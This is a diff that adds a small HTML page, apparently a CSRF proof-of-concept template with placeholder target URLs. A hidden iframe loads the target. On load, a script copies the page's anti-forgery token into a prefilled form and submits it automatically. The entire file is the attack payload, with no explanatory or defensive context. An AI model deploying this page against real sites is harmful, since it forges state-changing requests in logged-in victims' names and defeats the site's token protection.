@@ -1,0 +1,17 @@
+<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
+<input type="text" name="username" value="AA">
+<input type="checkbox" name="status" checked="checked">
+<input id="token" type="hidden" name="token" value="" />
+</form>
+
+<script type="text/javascript">
+function f1(){
+    x1=document.getElementById("i1");
+    x1d=(x1.contentWindow||x1.contentDocument);
+    t=x1d.document.getElementById("token").value;
+    
+    document.getElementById("token").value=t;
+    document.getElementById("form1").submit();
+}
+</script> 
+<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
